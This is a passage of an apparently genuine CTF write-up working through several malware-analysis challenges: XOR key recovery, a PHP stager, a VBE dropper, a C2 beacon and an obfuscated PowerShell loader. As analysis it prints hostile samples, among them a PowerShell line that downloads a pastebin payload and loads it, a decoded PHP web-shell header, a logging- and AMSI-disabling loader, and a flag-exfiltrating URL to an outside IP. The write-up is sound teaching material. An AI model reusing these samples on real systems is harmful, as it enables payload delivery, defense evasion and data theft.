00000010  0B 0A 01 08 4F 11 00 49 0A 1B 54 1E 4F 11 0E 0F  |....O..I..T.O...|
00000020  06 4E 79 67 09 0E 0E 0E 18 5F 4A 5F 58 56 5B 0B  |.Nyg....._J_XV[.|
00000030  56 5A 47 5F 5F 52 5C 5A 00 5A 16 0F 56 06 59 59  |VZG__R\Z.Z..V.YY|
00000040  5A 0A 12 0E 5A 07 57 5B 50 12                    |Z...Z.W[P.|

Decrypted:
00000000  69 48 55 59 43 4A 4F 01 4F 54 10 4F 46 45 4F 01  |iHUYCJO.OT.OFEO.|
00000010  4A 48 42 4C 0A 57 47 01 4B 59 17 5A 0A 57 49 47  |JHBL.WG.KY.Z.WIG|
00000020  47 0C 3A 23 4C 48 49 46 59 1D 09 1B 1D 10 1C 43  |G.:#LHIFY......C|
00000030  17 18 04 1B 1A 14 1B 12 41 18 55 4B 13 40 1E 11  |........A.UK.@..|
00000040  1B 48 51 4A 1F 41 10 13 11 50                    |.HQJ.A...P|

Encrypted XOR Decrypted:
00000000  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000010  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000020  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000030  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
00000040  41 42 43 44 45 46 47 48 41 42                    |ABCDEFGHAB|
```

Since we already know that the flag file probably contains only the flag, and begins with `flag{` and ends with `}`, we can probably derive most of the key by XORing these with the ciphertext. For instance, `flag{ XOR 28 0A 16 1D 06 = Nfwz}`.

Well, long story short after about an hour of writing a brute-force script, the first part of the `flag.txt` file was NOT `flag{`!! To solve this I managed to find the original decrypted `Bliss_Windows_XP.png` and XORd it with the provided encrypted version, and got: 

```
00000000  63 6f 73 6d 6f 62 6f 69 63 6f 73 6d 6f 62 6f 69  |cosmoboicosmoboi|
```

Putting that into the executable as the key resulted in the following flag file:

```
00000000  4b 65 65 70 69 6e 67 20 6d 79 20 66 6c 61 67 20  |Keeping my flag |
00000010  68 65 72 65 20 73 6f 20 69 74 27 73 20 73 61 66  |here so it's saf|
00000020  65 21 0a 0a 66 6c 61 67 7b 30 39 32 37 34 34 62  |e!..flag{092744b|
00000030  35 35 34 32 30 30 33 33 63 35 65 62 39 64 36 30  |55420033c5eb9d60|
00000040  39 65 61 63 35 65 38 32 33 7d                    |9eac5e823}|
```

Fortunately, the same key is used for every encrypted file, otherwise this would not have worked. This was my favorite challenge so far and I would love to see how others have solved it as well :)

## PHP Stager
This challenge was a PHP script that contained a large encoded string variable. To solve it I simply ran it step by step, printing every intermediate variable as I went. For instance, the script contains the following obfuscated code:

```php
$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
```

I want to know the value of $k, so after this line I added `print_r($k);` which gave me its value:

```
create_function
```

This is used on the next line:

```php
$k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
```

Printing some more variables:

```php
$fsPwhnfn8423 = base64_decode
```

The end of the script becomes:

```php
$c = create_function("/*XAjqgQvv4067*/", base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302")));
```

If we get the value of `base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302"))`, it returns an embedded PHP script:

```php
global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
global $cwd,$os,$safe_mode, $in;
$auth_pass = 'edbc761d111e1b86fb47681d9f641468';
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
...
```

The script itself looks like a remote access tool with a few functionalities like finding files or spawning a remote shell. The remote shell seems to be implemented as a Perl script, and has the following interesting line:

```
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
```

If we decode `F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`, we get the flag:

```
$ uudecode 
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT
`
end
$ cat uuencode.uu 
flag{9b5c4313d12958354be6284fcd63dd26}
```

## VeeBeeEee
This file presented an encoded VB script (extension is supposed to be `.vbe`). There are decoders online, and it decodes to an obfuscated script. I saw some references to PowerShell and such but I decided just to have it print out what it runs at the bottom of the script:

```
WScript.Echo Code <-- I added this in to see what Code was
Return = Object.Run(Code, 0, true)
```

The code that this statement executes is:
```
>cscript decoded.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

PowerShell $f='C:\Users\Public\Documents\July.htm';if (!(Test-Path $f)){Invoke-WebRequest 'https://pastebin.com/raw/SiYGwwcz' -outfile $f  };[System.Reflection.Assembly]::loadfile($f);[WorkArea.Work]::Exe()
```

What's in this pastebin?

```
$ curl -i https://pastebin.com/raw/SiYGwwcz
HTTP/2 200 
date: Fri, 27 Oct 2023 04:12:25 GMT
content-type: text/plain; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
x-xss-protection: 1;mode=block
cache-control: public, max-age=1801
cf-cache-status: MISS
last-modified: Fri, 27 Oct 2023 04:12:25 GMT
server: cloudflare
cf-ray: 81c819c19a5d3aac-DFW

<!-- flag{ed81d24958127a2adccfb343012cebff} -->
```

## OpenDir
This challenge opens an instance that serves a web index with a bunch of malicious files, so I pulled them all down:

```
$ wget --user opendir --password=opendir http://chal.ctf.games:32136/ -r --no-parent
Downloaded: 196 files, 18M in 5.0s (3.59 MB/s)
```

Then I grepped for the flag because there's no way I'm going through all of these manually:

```
$ grep -r ".*flag.*" .
grep: ./sir/LPE/InstallerFileTakeOver.exe: binary file matches
./sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
```

## Snake Oil
This was some sort of compiled Python malware. I decided to approach it dynamically first, and when I ran it through command prompt I saw this:

```
>snake-oil.exe
Downloading ngrok ...
```

Ngrok is a networking utility that I have seen leveraged before during some IR engagements by attackers to establish reverse proxies to compromised systems. Since the program was supposedly installing ngrok, I wanted to see if it was also configuring it as well. I ran `Process Monitor` and did some filtering, where I saw this entry:

```
snake-oil.exe CreateFile C:\Users\REM\.ngrok2\ngrok.yml SUCCESS
```

The contents of that file were the flag:

```
authtoken: flag{d7267ce26203b5cc69f4bab679cc78d2}

```

## Operation Eradication
This challenge launches a web instance and also has a file containing this:

```
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-
```


```
> rclone.exe ls dab:
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
   685745 ProductDevelopment/Reviews/NewProductReviewSummary.pdf
  2598294 ProductDevelopment/Reviews/UpdatedProductReviewSummary.pdf
  3279252 ProductDevelopment/Designs/NewProductDesign.pdf
```

I tried to delete all the files but was getting permission errors. After some thinking I decided to pull the files, delete their contents, and then re-upload them, effectively overwriting them. I wrote a simple PowerShell script to do this automatically:

```powershell
$directoryPath = "C:\Temp"
$fileList = Get-ChildItem -Path $directoryPath -Recurse -File

# Loop through each file and clear its content
foreach ($file in $fileList) {
    Clear-Content -Path $file.FullName
    Write-Host "Content cleared for file: $($file.FullName)"
}
```

Then ran the copy command using `rclone`:

```
> rclone -v copy c:\temp dab:    
```

When I revisited the challenge instance website, it presented the flag:

```
flag{564607375b731174f2c08c5bf16e82b4}
```

## Speakfriend
This challenge had to do with a binary that was communicating to a website that was likely compromised and was being used to host a C2 server. Typically, you have to send the C2 server the right HTTP request to get into the C2 functionality, which is otherwise hidden behind a legitimate-looking site.

I decided to do this one statically. I used Ghidra and the main function looked promising. I did some cleanup with renaming/retyping variables, and setting some equates:

```c
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  char *port;
  size_t post_options_length;
  long curl_handle;
  long in_FS_OFFSET;
  int i;
  char embedded_post_options [48];
  char post_options [112];
  char url_and_port [264];
  long local_20;
  char char_tmp;
  undefined8 url;
  
  local_20 = *(in_FS_OFFSET + 0x28);
  if ((1 < param_1) && (param_1 < 4)) {
    url = *(param_2 + 8);
    if (param_1 == 3) {
      port = *(param_2 + 0x10);
    }
    else {
      port = "443";
    }
    embedded_post_options._0_8_ = 0x2f616c6c697a6f4d;
    embedded_post_options._8_8_ = 0x6562333920302e35;
    embedded_post_options._16_8_ = 0x3762372d62353464;
    embedded_post_options._24_8_ = 0x392d373930342d30;
    embedded_post_options._32_8_ = 0x346138392d393732;
    embedded_post_options._40_8_ = 0x6533353330666561;
    post_options[0] = '\0';
    for (i = 0; i < 0x30; i = i + 1) {
      char_tmp = embedded_post_options[i];
      post_options_length = strlen(post_options);
      sprintf(post_options + post_options_length,"%c",char_tmp);
    }
    curl_global_init(3);
    do {
      curl_handle = curl_easy_init();
      if (curl_handle != 0) {
        iVar1 = strcmp(port,"443");
        if (iVar1 == 0) {
          curl_easy_setopt(curl_handle,CURLOPT_URL,url);
        }
        else {
          snprintf(url_and_port,0x100,"%s:%s",url,port);
          curl_easy_setopt(curl_handle,CURLOPT_URL,url_and_port);
        }
        curl_easy_setopt(curl_handle,CURLOPT_USERAGENT,post_options);
        curl_easy_setopt(curl_handle,CURLOPT_WRITEFUNCTION,write_callback);
        curl_easy_setopt(curl_handle,CURLOPT_VERBOSE,3);
        curl_easy_setopt(curl_handle,CURLOPT_HEADER,0);
        curl_easy_setopt(curl_handle,CURLOPT_NOPROGRESS,0);
        curl_easy_setopt(curl_handle,CURLOPT_SSL_VERIFYPEER,1);
        curl_easy_perform(curl_handle);
        curl_easy_cleanup(curl_handle);
      }
      sleep(0x1e);
    } while( true );
  }
  if (*(in_FS_OFFSET + 0x28) != *(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 1;
}
```

The documentation that I used to translate between a value of `0x2722` and its enumerated value of `CURLOPT_USERAGENT` can be found [here](https://github.com/curl/curl/blob/c0d4fbb1f5e64581813e8c8dbfd8e8b8d0a47483/packages/OS400/curl.inc.in).

Basically, what this program is doing is sending a GET request to a parameter-provided URL/port and setting the HTTP User-Agent to the following:

```
Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e
```

I ran this myself with curl:

```
$ curl -I "https://chal.ctf.games:32538" -k  -A "Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e" -i
HTTP/1.1 302 FOUND
Server: gunicorn
Date: Sat, 28 Oct 2023 23:58:05 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 267
Location: /93bed45b-7b70-4097-9279-98a4aef0353e/c2
Access-Control-Allow-Origin: *
```

It was nice enough to tell me where the C2 was! The flag was at that directory:

```
$ curl "https://chal.ctf.games:32538/93bed45b-7b70-4097-9279-98a4aef0353e/c2" -k  -A "Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e" -i
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 28 Oct 2023 23:58:16 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 39
Access-Control-Allow-Origin: *

flag{3f2567475c6def39501bab2865aeba60}
```

## Thumb Drive
This challenge downloads a Windows `.lnk` file. Inside this file is a URL:
```
https://tinyurl[.]com/a7ba6ma
```

The URL shortener resolves to a Google Doc with a large amount of Base32 encoded data. Decoded, it is actually a PE, more specifically a DLL. It exports two functions:
```
_DLLMain@12
_MessageBoxThread@4
```

I ran the DLL with `rundll32.exe`, targeting the `_MessageBoxThread@4` export, using the following command:
```
rundll32.exe download.dll,#2
```

This spawned a MessageBox with the flag:
```
flag{0af2873a74cfa957ccb90cef814cfe3d}
```

## Babel
This challenge presented source code for a C# application. The program would basically deocde a compiled assembly, load it, and then execute it. 

I wrote an equivalent python script that would just decode the assembly data and print it in hex:

```python
import base64

def decode(t, k):
    translation_str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    decode_buffer = ""
    decoded_char = dict(zip(k, translation_str))
    for char in t:
        if ('A' <= char <= 'Z') or ('a' <= char <= 'z'):
            decode_buffer += decoded_char[char]
        else:
            decode_buffer += char
    return decode_buffer

assembly_data = "CvsjeemeeeeXeeee//8e ..."
decode_lookup = "lQwSYRxgfBHqNucMsVonkpaTiteDhbXzLPyEWImKAdjZFCOvJGrU"
decoded_bytes = base64.b64decode(decode(assembly_data, decode_lookup))
print(''.join('{:02x}'.format(x) for x in decoded_bytes))
```

This decoded to a PE binary. I ran strings on it, and it happened to contain the flag:

```
...
XR4NtO
ZWaC
M{z)
flag{b6cfb6656ea0ac92849a06ead582456c}
H8H%D
jh%E
TG[An
...
```

## Hot off the Press
This challenge downloaded a UHA archive. I had to download a special program just to extract is as 7-Zip doesn't support this archive format. 

Once extracted, it presents a heavily obfuscated PowerShell program:

```powershell
C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp''+''oX7zCWHxBjby+UR''+''jzwaTw4OWq''+''kQ{1}M''+''u8XW2''+''DtJM{1}''+''omtGI''+''TFM8he5nIGAnbP''+''rOfiSf''+''Cfat2qb8W''+''uPFW{0}rlufP''+''gOzYcaD''+''GTrnvKbeq/''+''SWj0tC/ftXN8U5''+''9Uj2+ST2''+''WGHp/nUiIqgFjuk''+''l+mGrCi/USDN2''+''hvuAJn8rqJY''+''13G9VBn''+''HhTcNHa''+''ChyQMx4''+''kul''+''nZ{0}{1}a''+''AT{1}Wcr0kZyUUMHa''+''tdwX0''+''7CAQkiW6RsTI''+''/nkx+N8bF''+''3{0}00''+''ljS''+''CaieWIPiyD''+''2JFfUiq''+''n704YNC''+''D6QS1+l{0}Q''+''OJyYJoq''+''t+AIM{0}U4Zs8''+''i/MWO4c''+''Fsi91olY1sJpbpS''+''mBYG''+''9Jl1OjxIG''+''eSa+jOO''+''5kl''+''g4pcngl''+''n5UalMy7''+''yJvPq''+''3o6eZs2mX''+''3zgbAHTX6PK''+''{1}Zr''+''qHp''+''GYRBy''+''f2JBdrbGoXIgVz''+''sgGbaNGe/Yf''+''1SmP1UhP1V''+''u0U''+''e8ZDToP''+''JRn0r''+''7tr0pj38q{1}''+''ReTuIjmNI''+''YjtaxF1G/''+''zFPjuWjAl{1}{1}GR''+''7UUc9{1}9Qy8''+''GIDgCB''+''q{1}nFb4qKZ6oHU''+''dUbnSbKWUB''+''CNvHiCb''+''oFQbbfO''+''xMHjJD78QORAhd3''+''sYs''+''1aa4O6''+''CU{0}nb''+''{1}upxdtVFIbz{1}v''+''SSzSTXF7+hbpg8c''+''gsIgdJ7QYs''+''lPJs6r+4K6T''+''Mkl9{0}5Glu''+''Yn5{1}5zFtC''+''0eJ1KkPgYVIbj''+''o{0}8''+''GnHlOIWO''+''QzDaC57''+''tOwnF5/Fo+Wxx''+''juG7S0wnhgj8''+''Kh{0}1Wq''+''CPQ0Swuz2g''+''fZiZYMIpTJjosT5''+''oV4''+''OBS7I''+''8st{0}4RAf8HRc''+''hPkGa+Q''+''KSHZchP''+''D3WdcWmRIhcTDR6''+''GM2fVfnHhy''+''6uTOtAQ''+''UwTGyvTVur''+''qXKfi0+P''+''W8sVI4WAGVwCI''+''lQn''+''AgeNb0{1}ftv{0}Dxjj''+''Q6dlh+/lvbyX''+''9/K/{0}22X+XG''+''vHr''+''RZ0mnV635''+''0N7''+''+6d''+''Pmob8sR''+''bf{0}gc+/2j''+''O6vT''+''ufHt856786''+''dO6lz{1}e5i''+''e302D2/PjuxV''+''tzFMr''+''xqfFqP{0}3nQU3''+''c1G''+''9zXmzq+''+''YGzn4P8b''+''iM7f''+''Rwf85lk''+''4+Nh8w5''+''36Q1Z17P6vn7''+''WP8h1gW2R/n+0''+''m2g8UuZ''+''M{0}M3kN7UYyHh''+''T17M5+aw22''+''ch1+GvZO{0}oc3+bF''+''+FX2jz''+''PmifrIOWvTq''+''nNhse''+''D91Ba+iPwsPD''+''D2ZlPKCx3G1M1{1}W''+''+qwhS''+''RWP+p/''+''2tS+Al6''+''ud4''+''Ipl5DC8H5HTl''+''FX3C''+''xUnB1{0}qcKg3DU''+''{1}x/''+''ASIGhvQYCXR5sd''+''mMcV+RxJzSIUP''+''NeaOisYNO''+''5tVzNZNsBM0''+''H9lh2HRyM''+''0{1}u8{0}{0}O7rH''+''oKcShnVu1ut1ZD''+''7le7q+3htfj6''+''pbX4cm3ktix''+''FHjNwNtZZZt2s''+''0CkxjDfHC9''+''8H{1}unK{0}xB7C''+''Tyce''+''4H0AvlOfukrCJ''+''ucs20A''+''i5Vt8''+''u{1}R''+''fghcHVc/Vq+''+''D{0}FPQxA7''+''c{1}{1}0q/rzFxrX0''+''+uz6TZOnIC8z/AX''+''/mDwPfb8YfVVC1a''+''wcoCfd''+''jzseiN/bIX''+''DpUYmCf''+''aRhDPKHwQtAFB''+''tmK8gqP{0}gbpsWn''+''Hspnq''+''dxx8''+''emlmODf2GZMc5''+''4PA''+''AA='')-f''L'',''E'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"]
```

It may be hard to tell, but there is Base64 encoding in there, and it is piped into:

```powershell
&([scriptblock]::create(
    (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream(
        (New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((( ...
```

I proceeded with extracting just the Base64 content, a truncated example is:

```
''H4sI''+''AIeJ''+''G2UC/+1X'' .. +''4PA''+''AA='')-f''L'',''E''
```

The important thing to note here is the presence of the string formatting option `-f`, with the arguments `L,E`. This means, in the string that is passed to it, any `{0}` will be replaced with an `L`, and any `{1}` will be replaced by an `E`. I did this replacement manually, and then also manualy removed the double quotes and plus symbols, specifically, `''+''`. The result was raw Base64 text, which I decoded and ran through Gunzip in [CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'%7B0%7D'%7D,'L',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%7B1%7D'%7D,'E',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C'%5C'%2B%5C'%5C''%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C'%5C''%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=JydINHNJJycrJydBSWVKJycrJydHMlVDLysxWCcnKycnYlUvak9CRCszbDloclMnJysnJ0lsa1V7MH0nJysnJ1ZGdmJ7MX1JaUZkV3FEJycrJydiUFJKS1M4dlInJysnJ2JyVUt5JycrJydUUjE2OFRGY1FwbGIvLzcnJysnJ2pmTlN5Z0o3M3sxfWxJOTRGJycrJydJVnZ3eU14NC9NJycrJyc3WWZUOVBZbDVUSCcnKycnaEg3c2t1OFZVbnhkJycrJydUM2dSTVRUL2t1JycrJycvZldVU2pTM016cCcnKycnb1g3ekNXSHhCamJ5K1VSJycrJydqendhVHc0T1dxJycrJydrUXsxfU0nJysnJ3U4WFcyJycrJydEdEpNezF9JycrJydvbXRHSScnKycnVEZNOGhlNW5JR0FuYlAnJysnJ3JPZmlTZicnKycnQ2ZhdDJxYjhXJycrJyd1UEZXezB9cmx1ZlAnJysnJ2dPelljYUQnJysnJ0dUcm52S2JlcS8nJysnJ1NXajB0Qy9mdFhOOFU1JycrJyc5VWoyK1NUMicnKycnV0dIcC9uVWlJcWdGanVrJycrJydsK21HckNpL1VTRE4yJycrJydodnVBSm44cnFKWScnKycnMTNHOVZCbicnKycnSGhUY05IYScnKycnQ2h5UU14NCcnKycna3VsJycrJyduWnswfXsxfWEnJysnJ0FUezF9V2NyMGtaeVVVTUhhJycrJyd0ZHdYMCcnKycnN0NBUWtpVzZSc1RJJycrJycvbmt4K044YkYnJysnJzN7MH0wMCcnKycnbGpTJycrJydDYWllV0lQaXlEJycrJycySkZmVWlxJycrJyduNzA0WU5DJycrJydENlFTMStsezB9UScnKycnT0p5WUpvcScnKycndCtBSU17MH1VNFpzOCcnKycnaS9NV080YycnKycnRnNpOTFvbFkxc0pwYnBTJycrJydtQllHJycrJyc5SmwxT2p4SUcnJysnJ2VTYStqT08nJysnJzVrbCcnKycnZzRwY25nbCcnKycnbjVVYWxNeTcnJysnJ3lKdlBxJycrJyczbzZlWnMybVgnJysnJzN6Z2JBSFRYNlBLJycrJyd7MX1acicnKycncUhwJycrJydHWVJCeScnKycnZjJKQmRyYkdvWElnVnonJysnJ3NnR2JhTkdlL1lmJycrJycxU21QMVVoUDFWJycrJyd1MFUnJysnJ2U4WkRUb1AnJysnJ0pSbjByJycrJyc3dHIwcGozOHF7MX0nJysnJ1JlVHVJam1OSScnKycnWWp0YXhGMUcvJycrJyd6RlBqdVdqQWx7MX17MX1HUicnKycnN1VVYzl7MX05UXk4JycrJydHSURnQ0InJysnJ3F7MX1uRmI0cUtaNm9IVScnKycnZFViblNiS1dVQicnKycnQ052SGlDYicnKycnb0ZRYmJmTycnKycneE1IakpENzhRT1JBaGQzJycrJydzWXMnJysnJzFhYTRPNicnKycnQ1V7MH1uYicnKycnezF9dXB4ZHRWRkliensxfXYnJysnJ1NTelNUWEY3K2hicGc4YycnKycnZ3NJZ2RKN1FZcycnKycnbFBKczZyKzRLNlQnJysnJ01rbDl7MH01R2x1JycrJydZbjV7MX01ekZ0QycnKycnMGVKMUtrUGdZVkliaicnKycnb3swfTgnJysnJ0duSGxPSVdPJycrJydRekRhQzU3JycrJyd0T3duRjUvRm8rV3h4JycrJydqdUc3UzB3bmhnajgnJysnJ0toezB9MVdxJycrJydDUFEwU3d1ejJnJycrJydmWmlaWU1JcFRKam9zVDUnJysnJ29WNCcnKycnT0JTN0knJysnJzhzdHswfTRSQWY4SFJjJycrJydoUGtHYStRJycrJydLU0haY2hQJycrJydEM1dkY1dtUkloY1REUjYnJysnJ0dNMmZWZm5IaHknJysnJzZ1VE90QVEnJysnJ1V3VEd5dlRWdXInJysnJ3FYS2ZpMCtQJycrJydXOHNWSTRXQUdWd0NJJycrJydsUW4nJysnJ0FnZU5iMHsxfWZ0dnswfUR4amonJysnJ1E2ZGxoKy9sdmJ5WCcnKycnOS9LL3swfTIyWCtYRycnKycndkhyJycrJydSWjBtblY2MzUnJysnJzBONycnKycnKzZkJycrJydQbW9iOHNSJycrJydiZnswfWdjKy8yaicnKycnTzZ2VCcnKycndWZIdDg1Njc4NicnKycnZE82bHp7MX1lNWknJysnJ2UzMDJEMi9QanV4VicnKycndHpGTXInJysnJ3hxZkZxUHswfTNuUVUzJycrJydjMUcnJysnJzl6WG16cSsnJysnJ1lHem40UDhiJycrJydpTTdmJycrJydSd2Y4NWxrJycrJyc0K05oOHc1JycrJyczNlExWjE3UDZ2bjcnJysnJ1dQOGgxZ1cyUi9uKzAnJysnJ20yZzhVdVonJysnJ017MH1NM2tON1VZeUhoJycrJydUMTdNNSthdzIyJycrJydjaDErR3ZaT3swfW9jMytiRicnKycnK0ZYMmp6JycrJydQbWlmcklPV3ZUcScnKycnbk5oc2UnJysnJ0Q5MUJhK2lQd3NQRCcnKycnRDJabFBLQ3gzRzFNMXsxfVcnJysnJytxd2hTJycrJydSV1ArcC8nJysnJzJ0UytBbDYnJysnJ3VkNCcnKycnSXBsNURDOEg1SFRsJycrJydGWDNDJycrJyd4VW5CMXswfXFjS2czRFUnJysnJ3sxfXgvJycrJydBU0lHaHZRWUNYUjVzZCcnKycnbU1jVitSeEp6U0lVUCcnKycnTmVhT2lzWU5PJycrJyc1dFZ6TlpOc0JNMCcnKycnSDlsaDJIUnlNJycrJycwezF9dTh7MH17MH1PN3JIJycrJydvS2NTaG5WdTF1dDFaRCcnKycnN2xlN3ErM2h0Zmo2JycrJydwYlg0Y20za3RpeCcnKycnRkhqTndOdFpaWnQycycnKycnMENreGpEZkhDOScnKycnOEh7MX11bkt7MH14QjdDJycrJydUeWNlJycrJyc0SDBBdmxPZnVrckNKJycrJyd1Y3MyMEEnJysnJ2k1VnQ4JycrJyd1ezF9UicnKycnZmdoY0hWYy9WcSsnJysnJ0R7MH1GUFF4QTcnJysnJ2N7MX17MX0wcS9yekZ4clgwJycrJycrdXo2VFpPbklDOHovQVgnJysnJy9tRHdQZmI4WWZWVkMxYScnKycnd2NvQ2ZkJycrJydqenNlaU4vYklYJycrJydEcFVZbUNmJycrJydhUmhEUEtId1F0QUZCJycrJyd0bUs4Z3FQezB9Z2Jwc1duJycrJydIc3BucScnKycnZHh4OCcnKycnZW1sbU9EZjJHWk1jNScnKycnNFBBJycrJydBQT0nJw).

The resulting script block had the following interesting line:

```
http://.103.163.187.12:8080/?encoded_flag=%66%6c%61%67%7b%64%62%66%65%35%66%37%35%35%61%38%39%38%63%65%35%66%32%30%38%38%62%30%38%39%32%38%35%30%62%66%37%7d
```

URL decoding this in [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()&input=JTY2JTZjJTYxJTY3JTdiJTY0JTYyJTY2JTY1JTM1JTY2JTM3JTM1JTM1JTYxJTM4JTM5JTM4JTYzJTY1JTM1JTY2JTMyJTMwJTM4JTM4JTYyJTMwJTM4JTM5JTMyJTM4JTM1JTMwJTYyJTY2JTM3JTdk): 

```
flag{dbfe5f755a898ce5f2088b0892850bf7}
```

## Snake Eater II
This challenge was similar to snake eater I. I did this analysis dynamically. First, I ran it a few times with process monitor and searched for `flag.txt`, and saw that every run, the program was writing `flag.txt` to a random location, but then deleting it. 

To get around this, I opened it with x64Dbg. I searched for the moment it wrote `flag.txt` and inspected the buffer for the API call to `NtWriteFile`, which contained the flag.

```
NtWriteFile ( 0x00000000000001cc, NULL, NULL, NULL, 0x000000c72c5e9ad0, 0x00000247214decf0, 38, NULL, NULL )
```

```
